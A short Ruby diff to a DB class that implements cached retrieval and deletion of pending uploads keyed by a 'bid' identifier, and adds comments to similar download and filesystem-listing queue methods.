@@ -208,13 +208,31 @@ class DB
   end
 
   def new_uploads?(bid)
-    #TODO: uploads retrieval
-    #TODO: put the uploads in the cache
-    return false
+    # check if we have the uploads in the cache
+    # probably and old one not yet sent
+    return true if Cache.new_uploads? bid
+
+    # retrieve the downloads from the db
+    uploads = @db.new_uploads bid
+
+    # put the config in the cache
+    Cache.save_uploads bid, uploads unless uploads.empty?
+
+    return (uploads.empty?) ? false : true
   end
+
   def new_uploads(bid)
-    #TODO: retrieve the uploads from the cache
-    return {:filename => "c:\\cicciopasticcio", :content => "bubbaloa"}, 0
+    # retrieve the uploads from the cache
+    upload, left = Cache.new_upload bid
+
+    return nil if upload.nil?
+
+    # delete from the db
+    @db.del_upload upload[:id]
+    # delete the conf from the cache
+    Cache.del_upload upload[:id]
+
+    return upload[:upload], left
   end
 
   def new_downloads?(bid)
@@ -238,9 +256,11 @@ class DB
     return [] if downloads.empty?
 
     down = []
-    # remove the downlaods from the db
+    # remove the downloads from the db
     downloads.each_pair do |key, value|
+      # delete the entry from the db
       @db.del_download key
+      # return only the filename
       down << value
     end
 
@@ -273,7 +293,9 @@ class DB
     files = []
     # remove the filesystems from the db
     filesystems.each_pair do |key, value|
+      # delete the entry from the db
       @db.del_filesystem key
+      # return only the {:depth => , :path => } hash
       files << value
     end
 
